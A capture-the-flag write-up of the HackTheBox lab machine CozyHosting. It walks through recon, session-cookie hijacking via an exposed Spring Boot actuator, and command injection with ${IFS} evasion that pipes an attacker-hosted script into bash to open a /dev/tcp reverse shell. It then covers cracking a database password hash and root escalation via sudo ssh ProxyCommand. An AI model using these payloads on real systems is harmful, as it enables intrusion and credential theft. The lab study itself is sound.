## Intro

Tags: #linux #WebApp #commandinjection #DB #OSCPpath #known-binary #easy 

----
# Reconnaissance

Add machine to `/etc/hosts`
```shell
echo '10.129.229.88 cozyhosting.htb' | sudo tee -a /etc/hosts
```

## Port scan
### Identify open TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n  cozyhosting.htb
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-17 14:20 -0400
Nmap scan report for cozyhosting.htb (10.129.229.88)
Host is up (0.062s latency).
Not shown: 64910 closed tcp ports (reset), 623 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.65 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p22,80 -A cozyhosting.htb
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-17 14:22 -0400
Nmap scan report for cozyhosting.htb (10.129.229.88)
Host is up (0.054s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   58.16 ms 10.10.14.1
2   59.54 ms cozyhosting.htb (10.129.229.88)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.97 seconds
```

## WebApp

![](HTB_machines/MediaFiles/Pasted%20image%2020260617212339.png)

## Directories

```shell
dirsearch -u http://pilgrimage.htb// -x 403,404
```

```shell

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                                                             
                                                                                                                                                    
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/ch3ckm8/Downloads/git-dumper/reports/http_cozyhosting.htb/___26-06-17_14-25-08.txt

Target: http://cozyhosting.htb/

[14:25:08] Starting: /                                                                                                                              
[14:25:17] 200 -    0B  - //;admin/                                         
[14:25:17] 200 -    0B  - //;/login
[14:25:17] 200 -    0B  - //;json/                                          
[14:25:17] 200 -    0B  - //;login/                                         
[14:25:17] 200 -    0B  - //;/json                                          
[14:25:17] 200 -    0B  - //;/admin
[14:25:17] 400 -  435B  - //\..\..\..\..\..\..\..\..\..\etc\passwd          
[14:25:19] 400 -  435B  - //a%5c.aspx                                       
[14:25:20] 200 -    0B  - //actuator/;/beans                                
[14:25:20] 200 -    0B  - //actuator/;/env
[14:25:20] 200 -    0B  - //actuator/;/caches
[14:25:20] 200 -    0B  - //actuator/;/configurationMetadata
[14:25:20] 200 -    0B  - //actuator/;/conditions
[14:25:20] 200 -    0B  - //actuator/;/auditLog
[14:25:20] 200 -    0B  - //actuator/;/dump
[14:25:20] 200 -    0B  - //actuator/;/features
[14:25:20] 200 -    0B  - //actuator/;/configprops
[14:25:20] 200 -    0B  - //actuator/;/health
[14:25:20] 200 -    0B  - //actuator/;/auditevents
[14:25:20] 200 -    0B  - //actuator/;/flyway
[14:25:20] 200 -    0B  - //actuator/;/events
[14:25:20] 200 -    0B  - //actuator/;/exportRegisteredServices
[14:25:20] 200 -    0B  - //actuator/;/healthcheck                          
[14:25:20] 200 -    0B  - //actuator/;/heapdump                             
[14:25:20] 200 -    0B  - //actuator/;/httptrace                            
[14:25:20] 200 -    0B  - //actuator/;/info
[14:25:20] 200 -    0B  - //actuator/;/trace
[14:25:20] 200 -    0B  - //actuator/;/scheduledtasks
[14:25:20] 200 -    0B  - //actuator/;/releaseAttributes
[14:25:20] 200 -    0B  - //actuator/;/mappings
[14:25:20] 200 -    0B  - //actuator/;/refresh
[14:25:20] 200 -    0B  - //actuator/;/metrics
[14:25:20] 200 -    0B  - //actuator/;/resolveAttributes
[14:25:20] 200 -    0B  - //actuator/;/statistics
[14:25:20] 200 -    0B  - //actuator/;/loggers
[14:25:20] 200 -    0B  - //actuator/;/prometheus
[14:25:20] 200 -    0B  - //actuator/;/sessions
[14:25:20] 200 -    0B  - //actuator/;/liquibase
[14:25:20] 200 -    0B  - //actuator/;/loggingConfig
[14:25:20] 200 -    0B  - //actuator/;/ssoSessions
[14:25:20] 200 -    0B  - //actuator/;/shutdown
[14:25:20] 200 -    0B  - //actuator/;/jolokia
[14:25:20] 200 -    0B  - //actuator/;/integrationgraph
[14:25:20] 200 -    0B  - //actuator/;/sso
[14:25:20] 200 -    0B  - //actuator/;/registeredServices
[14:25:20] 200 -    0B  - //actuator/;/logfile
[14:25:20] 200 -    0B  - //actuator/;/threaddump
[14:25:20] 200 -    0B  - //actuator/;/status
[14:25:21] 200 -    0B  - //actuator/;/springWebflow                        
[14:25:21] 200 -  634B  - //actuator
[14:25:21] 200 -  145B  - //actuator/sessions                               
[14:25:21] 200 -    5KB - //actuator/env                                    
[14:25:22] 200 -   15B  - //actuator/health                                 
[14:25:22] 200 -   10KB - //actuator/mappings                               
[14:25:22] 200 -  124KB - //actuator/beans                                  
[14:25:22] 401 -   97B  - //admin                                           
[14:25:23] 200 -    0B  - //admin/%3bindex/                                 
[14:25:24] 200 -    0B  - //Admin;/                                         
[14:25:24] 200 -    0B  - //admin;/                                         
[14:25:35] 200 -    0B  - //axis//happyaxis.jsp                             
[14:25:35] 200 -    0B  - //axis2-web//HappyAxis.jsp
[14:25:35] 200 -    0B  - //axis2//axis2-web/HappyAxis.jsp
[14:25:39] 200 -    0B  - //Citrix//AccessPlatform/auth/clientscripts/cookies.js
[14:25:45] 200 -    0B  - //engine/classes/swfupload//swfupload.swf         
[14:25:45] 200 -    0B  - //engine/classes/swfupload//swfupload_f9.swf
[14:25:45] 500 -   73B  - //error                                           
[14:25:46] 200 -    0B  - //examples/jsp/%252e%252e/%252e%252e/manager/html/
[14:25:46] 200 -    0B  - //extjs/resources//charts.swf                     
[14:25:50] 200 -    0B  - //html/js/misc/swfupload//swfupload.swf           
[14:25:53] 200 -    0B  - //jkstatus;                                       
[14:25:55] 200 -    4KB - //login                                           
[14:25:55] 200 -    0B  - //login.wdm%2e                                    
[14:25:55] 204 -    0B  - //logout    
```
new endpoints revealed like `actuator` lets scan it further

### Enumerate directories of found directory
```shell
ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u "http://cozyhosting.htb/actuator/FUZZ" -t 200
```

```shell
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/actuator/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

health                  [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 297ms]
sessions                [Status: 200, Size: 98, Words: 1, Lines: 1, Duration: 332ms]
env                     [Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 765ms]
beans                   [Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 416ms]
:: Progress: [29999/29999] :: Job [1/1] :: 388 req/sec :: Duration: [0:01:10] :: Errors: 1 ::
```

### Enumerate files of found directory
next lets fuzz content too:
```shell
ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u "http://cozyhosting.htb/actuator/FUZZ" -e .txt,.md,.php,.html -t 200
```
Did not find files there, lets narrow it down further in terms of endpoint's content, lets search `actuator/sessions` next as its name seems promising
```shell
feroxbuster -u http://cozyhosting.htb/ -t 100 -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt -x "txt,html,php,asp,aspx,jsp,js,zip,pdf" -v -k -n -e --timeout 10 --status-codes 200,301,302,403 --output feroxbuster-port80-springboot
```

```shell
                                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cozyhosting.htb/
 🚩  In-Scope Url          │ cozyhosting.htb
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/spring-boot.txt
 👌  Status Codes          │ [200, 301, 302, 403]
 💥  Timeout (secs)        │ 10
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ feroxbuster-port80-springboot
 💲  Extensions            │ [txt, html, php, asp, aspx, jsp, js, zip, pdf]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔈  Verbosity             │ 1
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l        1w      634c http://cozyhosting.htb/actuator
200      GET        1l        1w       15c http://cozyhosting.htb/actuator/health
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/home
200      GET        1l        1w       48c http://cozyhosting.htb/actuator/sessions
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/path
200      GET        1l      218w    26053c http://cozyhosting.htb/assets/vendor/aos/aos.css
200      GET        1l       13w      487c http://cozyhosting.htb/actuator/env/lang
200      GET      295l      641w     6890c http://cozyhosting.htb/assets/js/main.js
200      GET       43l      241w    19406c http://cozyhosting.htb/assets/img/pricing-business.png
200      GET       97l      196w     4431c http://cozyhosting.htb/login
200      GET       83l      453w    36234c http://cozyhosting.htb/assets/img/values-3.png
200      GET       73l      470w    37464c http://cozyhosting.htb/assets/img/values-1.png
200      GET       29l      174w    14774c http://cozyhosting.htb/assets/img/pricing-ultimate.png
200      GET        1l      120w     4957c http://cozyhosting.htb/actuator/env
200      GET       34l      172w    14934c http://cozyhosting.htb/assets/img/pricing-starter.png
200      GET        1l      313w    14690c http://cozyhosting.htb/assets/vendor/aos/aos.js
200      GET       29l      131w    11970c http://cozyhosting.htb/assets/img/pricing-free.png
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/logo.png
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/favicon.png
200      GET        1l      108w     9938c http://cozyhosting.htb/actuator/mappings
200      GET       79l      519w    40905c http://cozyhosting.htb/assets/img/values-2.png
200      GET     2018l    10020w    95609c http://cozyhosting.htb/assets/vendor/bootstrap-icons/bootstrap-icons.css
200      GET       14l     1684w   143706c http://cozyhosting.htb/assets/vendor/swiper/swiper-bundle.min.js
200      GET        7l     1222w    80420c http://cozyhosting.htb/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
200      GET        1l      542w   127224c http://cozyhosting.htb/actuator/beans
200      GET        1l      625w    55880c http://cozyhosting.htb/assets/vendor/glightbox/js/glightbox.min.js
200      GET       81l      517w    40968c http://cozyhosting.htb/assets/img/hero-img.png
200      GET     2397l     4846w    42231c http://cozyhosting.htb/assets/css/style.css
200      GET        7l     2189w   194901c http://cozyhosting.htb/assets/vendor/bootstrap/css/bootstrap.min.css
200      GET      285l      745w    12706c http://cozyhosting.htb/
[####################] - 5s     12200/12200   0s      found:30      errors:0      
[####################] - 4s      1130/1130    256/s   http://cozyhosting.htb/ 
```

lets view the `/sessions` on browser:
![](MediaFiles/Pasted%20image%2020260617213854.png)
interesting! this would most probably be a session id
```shell
3D5C54F678ED51D0B22DFAD3215666F7	
kanderson
```

## Cookie leak via failed login
then after some login failures found another session id
```shell
└─$ curl --silent http://cozyhosting.htb/actuator/sessions | jq                                                                                   
{
  "5B699888311236429D281EADBDF445C8": "kanderson"
}

┌──(ch3ckm8㉿kali)-[~/Downloads]
└─$ curl -s http://cozyhosting.htb/actuator/sessions | jq .                                                                                         
{
  "4B92CEB3C49EBD6F2BE65D36E9D51201": "UNAUTHORIZED",
  "5B699888311236429D281EADBDF445C8": "kanderson"
}

```
replaced kanderson cookie on the browser and we are now prompted to admin dashboard
## Admin panel access
![](MediaFiles/Pasted%20image%2020260617214307.png)
![](MediaFiles/Pasted%20image%2020260617214341.png)

----
# Foothold

## Command injection

Lets test stuff
![](MediaFiles/Pasted%20image%2020260617214539.png)
next test:
```shell
python3 -m http.server 8001
```

```shell
127.0.0.1
kanderson;wget http://10.10.14.148:8001/image.png
```
### Blocked
gives error
![](MediaFiles/Pasted%20image%2020260617214840.png)

### Evasion
to evade it, i added `${IFS}`
```shell
127.0.0.1
kanderson;wget${IFS}http://10.10.14.148:8001/image.png;
```
and got request on my local server
```shell
┌──(ch3ckm8㉿kali)-[~/Downloads/squashfs-root]
└─$ python3 -m http.server 8001                                                                                                                  
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.129.229.88 - - [17/Jun/2026 14:50:01] "GET /image.png HTTP/1.1" 200 -
```
so lets upload a bash rev shell
```shell
┌──(ch3ckm8㉿kali)-[~/Downloads/squashfs-root]
└─$ cat rev.sh   
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.148/5555 0>&1
```

```shell
127.0.0.1
kanderson;curl${IFS}10.10.14.148:8001/rev.sh|bash;
```
got shell back!
## Shell as app
```shell
└─$ nc -lvnp 5555                                                                                                                                   
listening on [any] 5555 ...
connect to [10.10.14.148] from (UNKNOWN) [10.129.229.88] 32908
bash: cannot set terminal process group (1000): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ ls
ls
cloudhosting-0.0.1.jar 
```

### File enumeration

lets unzip the jar file to `/tmp`
```shell
unzip -d /tmp/app cloudhosting-0.0.1.jar
```
lets view its contents
```shell
app@cozyhosting:/tmp/app$ ls
ls
BOOT-INF  META-INF  org
```

```shell
grep -r "pass" --include="*.txt" --include="*.conf" /
```
on `/tmp/app/BOOT-INF/classes/application.properties` found password
```shell
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxRapp@cozyhosting:/app$ 
```
#### creds obtained
```shell
postgres
Vg&nvzAQ7XxR
```

### Connect to postgres

```shell
psql -h 127.0.0.1 -U postgres
```

```
\list
\connect cozyhosting
\dt
select * from users;
```

```shell

\list
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
(4 rows)

\connect cozyhosting
You are now connected to database "cozyhosting" as user "postgres".
\dt
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)

select * from users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```
#### hash obtained
```shell
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
```
### Hash cracking
```shell
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)     
1g 0:00:00:15 DONE (2026-06-17 15:01) 0.06635g/s 186.3p/s 186.3c/s 186.3C/s catcat..keyboard
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

#### creds obtained
```shell
manchesterunited
```

but what user's pass is this? lets see `/etc/passwd` to find out users we can login towards:
```
cat /etc/passwd | grep /bin/bash
```

```shell
app@cozyhosting:/app$ cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
josh:x:1003:1003::/home/josh:/usr/bin/bash
```
okay, lets try josh
## Shell as josh
```shell
su josh
Password: manchesterunited
whoami
josh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
grabbed user flag
```shell
josh@cozyhosting:~$ cat user.txt
cat user.txt
6b9d25732d7f887a3acf95bfb6aee12e
```
lets now connect via ssh too to continue uninterupted
```shell
ssh josh@cozyhosting.htb
```

-----
# Privesc

## sudo -l

```shell
josh@cozyhosting:~$ sudo -l
sudo -l
[sudo] password for josh: manchesterunited

Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

### Known binary
found this on GTFO bins
https://gtfobins.org/gtfobins/ssh/
```shell
ssh localhost /bin/sh
```
this did not work, the next one did tho, grabbed root flag

## Shell as root
```shell
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
# whoami
root
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@cozyhosting:/home/josh# cd
root@cozyhosting:~# cat root.txt
febb2aab46cf25f72d5e4dfa4b785e5f
root@cozyhosting:~# 
```

------
# Summary



----
# Sidenotes